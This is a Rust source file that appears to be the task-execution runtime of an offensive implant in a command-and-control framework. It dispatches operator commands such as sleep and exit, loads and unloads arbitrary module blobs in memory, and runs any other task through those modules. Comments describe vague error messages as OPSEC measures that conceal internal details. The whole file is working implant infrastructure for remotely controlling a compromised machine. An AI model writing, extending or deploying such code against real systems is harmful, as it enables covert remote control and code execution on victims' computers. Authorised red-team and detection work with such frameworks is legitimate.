//! Implant runtime - task execution
//!
//! Uses the module registry for unified task dispatch.

use common::{JobManager, ModuleId, TaskId};
use protocol::{
    module_task::Operation, LoadedModuleInfo as ProtoLoadedModuleInfo, ModuleOperationResult,
    ModuleTask, Task, TaskResponse, TaskStatus, TaskSuccess, Timestamp,
};
use std::sync::Arc;

use crate::error::{ImplantError, ImplantResult};
use crate::registry::{self, ModuleSource};

/// Implant runtime - handles task execution
pub struct ImplantRuntime {
    pub job_manager: Option<Arc<JobManager>>,
}

impl ImplantRuntime {
    /// Create a new runtime
    pub fn new() -> Self {
        // Initialize the registry on startup
        let _ = registry::registry();
        Self {
            job_manager: Some(Arc::new(JobManager::new(10))), // Max 10 concurrent jobs
        }
    }

    /// Get reference to job manager
    #[allow(dead_code)]
    pub fn job_manager(&self) -> Option<&Arc<JobManager>> {
        self.job_manager.as_ref()
    }

    /// Execute a task and return the response
    pub async fn execute_task(&self, task: &Task) -> TaskResponse {
        let task_id_str = task.task_id.clone();

        let result = match task.task_type.as_str() {
            // Built-in control commands (not modules)
            "sleep" => {
                // Update sleep interval handled by caller
                Ok(vec![])
            }
            "exit" => {
                // Signal exit handled by caller
                Err(ImplantError::ExitRequested)
            }
            // Module management operations (load/unload/list)
            "module" => self.execute_module_operation(&task.task_data),
            // All other tasks go through the module registry
            task_type => self.execute_module_task(task_type, &task.task_data),
        };

        match result {
            Ok(result_data) => TaskResponse {
                task_id: task_id_str,
                status: TaskStatus::Completed as i32,
                result: Some(protocol::task_response::Result::Success(TaskSuccess {
                    result_data,
                })),
                completed_at: Some(Timestamp::now()),
            },
            Err(e) => TaskResponse {
                task_id: task_id_str,
                status: TaskStatus::Failed as i32,
                result: Some(protocol::task_response::Result::Error(
                    protocol::TaskError {
                        code: -1,
                        message: e.to_string(),
                        details: None,
                    },
                )),
                completed_at: Some(Timestamp::now()),
            },
        }
    }

    /// Execute a task via the module registry
    fn execute_module_task(&self, task_type: &str, task_data: &[u8]) -> ImplantResult<Vec<u8>> {
        let reg = registry::registry();

        let module = reg
            .get(task_type)
            .ok_or_else(|| ImplantError::Task(format!("unknown task type: {}", task_type)))?;

        let task_id = TaskId::new();
        let result = module
            .handle(task_id, task_data)
            .map_err(|e| ImplantError::Task(e.to_string()))?;

        // Serialize the TaskResult to bytes
        let result_bytes = serde_json::to_vec(&result)
            .map_err(|e| ImplantError::Task(format!("failed to serialize result: {}", e)))?;

        Ok(result_bytes)
    }

    /// Execute a module management operation (load/unload/list)
    ///
    /// This handles the "module" task type, dispatching to the registry's
    /// dynamic module management methods.
    fn execute_module_operation(&self, task_data: &[u8]) -> ImplantResult<Vec<u8>> {
        let module_task: ModuleTask = protocol::decode(task_data)
            .map_err(|e| ImplantError::Task(format!("failed to decode ModuleTask: {}", e)))?;

        let operation = module_task
            .operation
            .ok_or_else(|| ImplantError::Task("ModuleTask has no operation".into()))?;

        let reg = registry::registry();

        let result = match operation {
            Operation::Load(load) => {
                match reg.load_dynamic(&load.module_blob) {
                    Ok(module_id) => ModuleOperationResult {
                        operation: "load".into(),
                        module_id: module_id.as_str().to_string(),
                        success: true,
                        message: None,
                        loaded_modules: vec![],
                    },
                    Err(_e) => ModuleOperationResult {
                        operation: "load".into(),
                        module_id: String::new(),
                        success: false,
                        // Generic error message to avoid leaking internal details (OPSEC)
                        message: Some("module load failed".into()),
                        loaded_modules: vec![],
                    },
                }
            }

            Operation::Unload(unload) => {
                let module_id = ModuleId::new(&unload.module_id);
                match reg.unload_dynamic(&module_id) {
                    Ok(()) => ModuleOperationResult {
                        operation: "unload".into(),
                        module_id: unload.module_id,
                        success: true,
                        message: None,
                        loaded_modules: vec![],
                    },
                    Err(_e) => ModuleOperationResult {
                        operation: "unload".into(),
                        module_id: unload.module_id,
                        success: false,
                        // Generic error message to avoid leaking internal details (OPSEC)
                        message: Some("module unload failed".into()),
                        loaded_modules: vec![],
                    },
                }
            }

            Operation::List(_) => {
                let modules: Vec<ProtoLoadedModuleInfo> = reg
                    .all_module_info()
                    .into_iter()
                    .map(|info| ProtoLoadedModuleInfo {
                        module_id: info.id.clone(),
                        name: info.name,
                        version: info.version,
                        loaded_at: info.load_time,
                        memory_size: match info.source {
                            ModuleSource::Static => 0, // Static modules don't track memory
                            ModuleSource::Dynamic { .. } => 0, // Dynamic module memory is managed by the loader
                        },
                    })
                    .collect();

                ModuleOperationResult {
                    operation: "list".into(),
                    module_id: String::new(),
                    success: true,
                    message: None,
                    loaded_modules: modules,
                }
            }
        };

        Ok(protocol::encode(&result))
    }
}

impl Default for ImplantRuntime {
    fn default() -> Self {
        Self::new()
    }
}
